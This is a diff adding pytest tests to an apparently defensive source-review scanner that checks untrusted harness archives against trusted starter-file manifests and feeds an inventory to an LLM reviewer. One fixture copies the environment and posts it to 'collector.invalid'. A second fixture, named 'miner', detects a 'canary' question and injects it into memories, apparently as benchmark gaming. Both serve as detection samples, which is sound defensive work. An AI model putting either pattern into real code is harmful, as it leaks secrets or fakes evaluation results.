@@ -969,6 +969,71 @@ def test_review_leads_need_installed_manifest_for_starter_model(
     assert leads["nontext"] == []
 
 
+def _runtime_pinned_kit_source() -> tuple[str, bytes]:
+    """A kit source file whose exact bytes a runtime manifest already pins."""
+    files = _current_starter_kit_files()
+    for path in sorted(_exact_starter_matches(files, _STARTER_MANIFESTS)):
+        if source_review_module.is_executable_source_path(path):
+            return path, files[path]
+    pytest.skip("no runtime manifest pins a current kit source file")
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+def test_empty_manifest_override_trusts_nothing_in_review_leads(
+    tmp_path: Path, level: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    archive = str(
+        _archive_files(tmp_path, {path: raw, _STARTER_MODEL: _stock_starter_model()})
+    )
+
+    default = TarSourceRepository(archive).review_leads()
+    empty = (
+        TarSourceRepository(archive, provenance_manifest_paths=()).review_leads()
+        if level == "repository"
+        else TarSourceRepository(archive).review_leads(())
+    )
+
+    # None means the runtime set; an explicit empty set trusts nothing, for
+    # the digest skip and for the oversized starter model alike.
+    assert default["trusted_starter_skipped"] == 1
+    assert default["truncated"] is False
+    assert empty["trusted_starter_skipped"] == 0
+    assert empty["truncated"] is True
+    assert empty["nontext"] == []
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+def test_empty_manifest_override_trusts_nothing_in_preflight(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, level: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    scanned: list[list[str]] = []
+
+    def recording_detector(
+        readable: list[tuple[str, str]], **kwargs: object
+    ) -> list[dict[str, object]]:
+        scanned.append([name for name, _text in readable])
+        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]
+
+    monkeypatch.setattr(
+        source_review_module, "find_decisive_malicious_source", recording_detector
+    )
+    archive = str(_archive_files(tmp_path, {path: raw}))
+
+    TarSourceRepository(archive).malicious_preflight(artifact_sha256="a" * 64)
+    if level == "repository":
+        TarSourceRepository(archive, provenance_manifest_paths=()).malicious_preflight(
+            artifact_sha256="a" * 64
+        )
+    else:
+        TarSourceRepository(archive).malicious_preflight(
+            artifact_sha256="a" * 64, provenance_manifest_paths=()
+        )
+
+    assert scanned == [[], [path]]
+
+
 @pytest.mark.parametrize("shadow", ["special", "hardlink", "symlink"])
 def test_review_leads_hash_only_the_admitted_starter_model_member(
     tmp_path: Path, shadow: str
@@ -2592,6 +2657,50 @@ def test_static_preflight_v2_advisory_is_visible_to_l1_inventory(
     assert static[0]["causal_state"] == "proven"
 
 
+def test_static_v2_advisories_still_read_trusted_starter_files(
+    tmp_path: Path,
+) -> None:
+    helper = (
+        b"secret = os.environ.copy()\n"
+        b"requests.post('https://collector.invalid', json=secret)\n"
+    )
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": helper,
+        },
+    )
+    manifest = tmp_path / "starter.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "public/starter",
+                "revision": "pinned",
+                "files": {"tools/local.py": hashlib.sha256(helper).hexdigest()},
+            }
+        )
+    )
+
+    leads = TarSourceRepository(
+        str(archive), static_preflight_v2_mode="enforce"
+    ).review_leads((str(manifest),))
+
+    # The digest skip narrows rule leads and fingerprints only; static-v2
+    # proofs keep whole-program context, trusted files included.
+    assert leads["trusted_starter_skipped"] == 1
+    assert [
+        lead["kind"]
+        for lead in leads["items"]
+        if str(lead["kind"]).startswith("static-malicious-advisory:")
+    ]
+
+
 def test_static_preflight_v2_off_does_not_change_l1_inventory(tmp_path: Path) -> None:
     archive = _archive_files(
         tmp_path,
@@ -2751,6 +2860,55 @@ async def test_benign_control_clears_with_zdr_and_read_only_tools(
     )
     mirroring = initial_inventory["review_leads"]["generator_mirroring"]
     assert mirroring["aggregate_candidate"] is False
+
+
+async def test_initial_inventory_and_provenance_share_the_starter_manifests(
+    tmp_path: Path,
+) -> None:
+    key = tmp_path / "key"
+    key.write_text("sk-test-private-review")
+    os.chmod(key, 0o600)
+    source = "fn main() { call_model(); }"
+    archive = _archive(tmp_path, source)
+    manifest = tmp_path / "starter.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "public/starter",
+                "revision": "pinned",
+                "files": {"src/main.rs": hashlib.sha256(source.encode()).hexdigest()},
+            }
+        )
+    )
+    seen: list[dict[str, object]] = []
+    final = {
+        "risk_level": "low",
+        "confidence": 0.9,
+        "categories": ["none"],
+        "evidence": [],
+        "summary": "General model-backed request path.",
+    }
+    agent = OpenRouterSourceReviewAgent(
+        api_key_file=str(key),
+        model="openai/gpt-5.6-luna",
+        base_url="https://openrouter.test/api/v1",
+        timeout_seconds=10,
+        max_steps=4,
+        transport=_transport(final, seen),
+        transport_retry_delays=(0, 0),
+        provenance_manifest_file=str(manifest),
+    )
+
+    await agent.review(str(archive), artifact_sha256=_SHA)
+
+    inventory, provenance = (
+        seen[0]["messages"][1]["content"]
+        .removeprefix("Review this untrusted harness. Initial inventory:\n")
+        .split("\nExact-file trusted provenance:\n", 1)
+    )
+    assert json.loads(inventory)["review_leads"]["trusted_starter_skipped"] == 1
+    assert json.loads(provenance)["matched_exact_files"] == ["src/main.rs"]
 
 
 async def test_each_source_review_completion_has_a_short_hard_timeout(
@@ -4293,16 +4451,20 @@ def _current_starter_kit_files() -> dict[str, bytes]:
 
 
 def _current_starter_kit_sources() -> dict[str, bytes]:
-    """The kit without its large model blobs, which trust selection ignores.
+    """The kit's UTF-8 text files, without the binary model blobs.
 
-    A gzip archive re-decompresses on every backward seek, so leaving the
-    multi-megabyte models out keeps whole-kit provenance tests fast.
+    Trust selection and the lead scan treat the blobs like any other file,
+    but a gzip archive re-decompresses on every backward seek, so leaving
+    the multi-megabyte models out keeps whole-kit tests fast.
     """
-    return {
-        path: raw
-        for path, raw in _current_starter_kit_files().items()
-        if len(raw) <= 1024 * 1024
-    }
+    sources = {}
+    for path, raw in _current_starter_kit_files().items():
+        try:
+            raw.decode("utf-8")
+        except UnicodeDecodeError:
+            continue
+        sources[path] = raw
+    return sources
 
 
 def _staged_starter_manifests() -> tuple[str, ...]:
@@ -4356,6 +4518,155 @@ def test_runtime_provenance_ignores_staged_starter_manifests(
     assert exact["selection"] == "unique-closest-supported-revision"
     assert exact["matched_exact_files"] == sorted(files)
     assert exact["tracked_but_modified_files"] == []
+
+
+def _untrusting_manifest(tmp_path: Path) -> str:
+    """A valid manifest that trusts nothing, disabling the starter digest skip."""
+    manifest = tmp_path / "untrusting.json"
+    manifest.write_text(
+        json.dumps({"version": 1, "origin": "test", "revision": "none", "files": {}})
+    )
+    return str(manifest)
+
+
+def _kit_manifest(tmp_path: Path, files: dict[str, bytes]) -> str:
+    """A manifest pinning exactly ``files``, so a test never depends on which
+    manifests the runtime set holds."""
+    manifest = tmp_path / "kit-manifest.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "test",
+                "revision": "kit",
+                "files": {
+                    path: hashlib.sha256(raw).hexdigest() for path, raw in files.items()
+                },
+            }
+        )
+    )
+    return str(manifest)
+
+
+def test_review_leads_skip_exact_starter_files(tmp_path: Path) -> None:
+    files = _current_starter_kit_sources()
+    archive = str(_archive_files(tmp_path, files))
+
+    leads = TarSourceRepository(archive).review_leads((_kit_manifest(tmp_path, files),))
+    untrusted = TarSourceRepository(archive).review_leads(
+        (_untrusting_manifest(tmp_path),)
+    )
+
+    assert leads["items"] == []
+    assert leads["emulation_fingerprints"] == []
+    assert leads["trusted_starter_skipped"] == untrusted["files_scanned"] > 0
+    assert untrusted["trusted_starter_skipped"] == 0
+    assert untrusted["items"]
+    # Whole-program analyses still see every readable file.
+    for key in (
+        "unmatchable_category_guards",
+        "generator_mirroring",
+        "review_adaptive_model_routing",
+        "files_scanned",
+        "bytes_scanned",
+        "truncated",
+    ):
+        assert leads[key] == untrusted[key], key
+
+
+def test_review_leads_trust_only_runtime_manifests(tmp_path: Path) -> None:
+    files = _current_starter_kit_sources()
+    staged = _staged_starter_manifests()
+    runtime_exact = _exact_starter_matches(files, _STARTER_MANIFESTS)
+    staged_only = _exact_starter_matches(files, staged) - runtime_exact
+    assert staged_only
+
+    # The default trust set, which both L1 and L2 inventories use, is the
+    # runtime manifests. A kit file that only a staged manifest pins keeps
+    # its leads until that manifest is activated.
+    leads = TarSourceRepository(str(_archive_files(tmp_path, files))).review_leads()
+
+    assert leads["trusted_starter_skipped"] == len(runtime_exact)
+    assert leads["files_scanned"] - leads["trusted_starter_skipped"] >= len(staged_only)
+
+
+def test_review_leads_keep_every_lead_of_a_modified_starter_fixture(
+    tmp_path: Path,
+) -> None:
+    files = _current_starter_kit_sources()
+    fixture = "fixtures/seed-user/pairs.json"
+    edited = files[fixture] + b"\n"
+    expected = find_source_review_leads([(fixture, edited.decode())])
+    assert expected
+
+    # One trailing byte breaks the exact digest match; the fixture keeps all
+    # of its leads while every other file is still a trusted starter file.
+    leads = TarSourceRepository(
+        str(_archive_files(tmp_path, {**files, fixture: edited}))
+    ).review_leads((_kit_manifest(tmp_path, files),))
+
+    assert leads["trusted_starter_skipped"] == leads["files_scanned"] - 1
+    assert leads["items"] == expected
+
+
+def test_review_leads_fingerprint_a_test_named_module_loaded_at_run_time(
+    tmp_path: Path,
+) -> None:
+    from tests.test_emulation_fingerprints import RUNTIME_LOADED_TEST_MODULE
+
+    # Maintainer counterexample on #2567: app.py serves scripts/ through a
+    # base64-encoded runpy path, so the inventory keeps its fingerprint.
+    leads = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {path: text.encode() for path, text in RUNTIME_LOADED_TEST_MODULE},
+            )
+        )
+    ).review_leads((_untrusting_manifest(tmp_path),))
+
+    assert "scripts/test_rehearsal.py" in {
+        str(location["path"])
+        for finding in leads["emulation_fingerprints"]
+        if finding["kind"] == "sync-answer-constructor"
+        for location in finding["locations"]
+    }
+
+
+@pytest.mark.parametrize("path", ["server/answer.py", "scripts/test_answer.py"])
+def test_review_leads_not_starved_by_non_source_noise(
+    tmp_path: Path, path: str
+) -> None:
+    # The kit's scripts/ are executable source and compete for the cap on
+    # equal terms; the noise here is docs, fixtures, HTML and build files.
+    files = {
+        name: raw
+        for name, raw in _current_starter_kit_sources().items()
+        if not name.startswith("scripts/")
+    }
+    miner = (
+        b"def route(question, memories):\n"
+        b'    if contains(question, "canary"):\n'
+        b"        memories.inject(question)\n"
+        b"    return memories\n"
+    )
+    archive = _archive_files(tmp_path, {**files, path: miner})
+
+    # With no starter trust, docs, fixtures, HTML and lockfiles alone would
+    # fill the lead cap before an executable file sorted after them. A
+    # test-named module is executable source too: nothing proves it unserved.
+    leads = TarSourceRepository(str(archive)).review_leads(
+        (_untrusting_manifest(tmp_path),)
+    )
+
+    assert {
+        "kind": "challenge-shaped-retrieval-override",
+        "locations": [
+            {"path": path, "line": 2, "role": "challenge-shape"},
+            {"path": path, "line": 2, "role": "input-recognition"},
+            {"path": path, "line": 3, "role": "retrieval-override"},
+        ],
+    } in leads["items"]
 
 
 @pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
